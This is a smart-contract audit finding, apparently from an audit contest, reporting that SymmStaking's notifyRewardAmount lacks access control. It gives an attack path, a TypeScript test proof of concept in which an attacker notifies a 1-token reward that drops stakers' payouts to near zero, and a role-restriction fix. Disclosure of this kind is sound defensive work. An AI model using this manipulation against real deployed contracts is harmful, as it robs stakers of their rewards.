# Reward manipulation in `SymmStaking`  due to insufficient authentication in notifyRewardAmount

### Summary

The SymmStaking contract contains a critical vulnerability in the [notifyRewardAmount](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L275). This vulnerability allows unauthorized users to manipulate reward distribution for whitelisted reward tokens by setting arbitrarily low reward amounts, resulting in financial losses for stakers and unfair reward allocation. 

### Root Cause

The function `notifyRewardAmount` in [SymmStaking:275](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L275) is not restricted to administrators or authorized entities



### Attack Path

1.  A legitimate user stakes tokens for a predefined duration (DEFAULT_REWARDS_DURATION)
2. The staking contract calculates rewards based on an initial reward rate set by the admin.
3. An attacker (with a minimal amount of tokens) calls notifyRewardAmount with a very small value, effectively reducing the per-token reward calculation.
4. When the legitimate user attempts to claim rewards, they receive significantly fewer tokens than expected, due to the manipulated reward rate.
5. This issue arises because there is no authentication or role restriction in notifyRewardAmount, allowing any entity with tokens to alter reward distribution.


### Impact

The impact is high as this vulnerability allows unauthorized users to manipulate staking rewards rate, leading to unfair distribution and potential financial losses.

### PoC

Steps to run PoC - 

Paste the below test block in the file `symmStaking.behavior.ts`

```typescript
	it("Should show reward manipulation due to insufficient authentication of notifyRewardAmount", async function () {
			// Scenario:
			// 1. user deposits tokens (equal to 1 week)
			// 2. time passes, user claims rewards (based on reward rate set by admin)
			// 4. Attacker updates the notifyRewardAmount to very small amount
			// 5. Time passes, user claims rewards (based on the new reward rate) which is very small due to attacker's manipulation

			// 1 week in seconds
			const depositAmount = "604800"
			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
			await symmStaking.connect(user1).deposit(depositAmount, user1.address)

			// Admin mints and notifies rewards
			const rewardAmount = "604800"
			await usdtToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
			await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount])

			// Fast-forward time by 200 seconds
			await time.increase(200)

			// User claims rewards. User should get 200 tokens (200 seconds * 1 token/sec)
			let user1BalanceBefore = await usdtToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			let user1BalanceAfter = await usdtToken.balanceOf(user1.address)
			const user1Claimed = user1BalanceAfter - user1BalanceBefore
			expect(user1Claimed).to.equal("200")

			//Full period reward should be equal to the notified reward amount by admin
			let fullPeriodReward = await symmStaking.getFullPeriodReward(await usdtToken.getAddress())
			expect(fullPeriodReward).to.equal(rewardAmount) // Should match the notified reward amount

			const rewardAmount2 = "1"
			//Transfer some tokens to attacker(Ideally the attacker would have some tokens). Just for testing purposes
			await usdtToken.connect(admin).transfer(attacker.address, rewardAmount2)
			// Attacker updates the notifyRewardAmount to very small amount
			await usdtToken.connect(attacker).approve(await symmStaking.getAddress(), rewardAmount2)
			// Attacker notifies the reward amount with a very small amount
			await symmStaking.connect(attacker).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount2])

			// Fast-forward time by 200 seconds
			await time.increase(200)

			// Ideally user should again get 200 tokens(200 seconds * 1 token/sec), but now the reward amount is very small
			// As the attacker has set the reward amount to very small
			// The reward amount is very small and user gets very less tokens
			user1BalanceBefore = await usdtToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			user1BalanceAfter = await usdtToken.balanceOf(user1.address)
			const user1Claimed2 = user1BalanceAfter - user1BalanceBefore

			// User get less than 200 tokens for same deposit amount and same time period
			expect(user1Claimed2).to.not.equal("200")

			// Since small amount is passed the reward per token is very small and calculation truncates to 0.
			// So for any whitelisted reward token , the getFullPeriodReward returns zero
			fullPeriodReward = await symmStaking.getFullPeriodReward(await usdtToken.getAddress())
			console.log("fullPeriodReward", fullPeriodReward)
			expect(fullPeriodReward).to.equal("0")
		})
```

### Mitigation

Add `REWARD_MANAGER_ROLE` or `DEFAULT_ADMIN_ROLE` to  `notifyRewardAmount`

```diff

- function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused {
+ function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused onlyRole(REWARD_MANAGER_ROLE) {

```
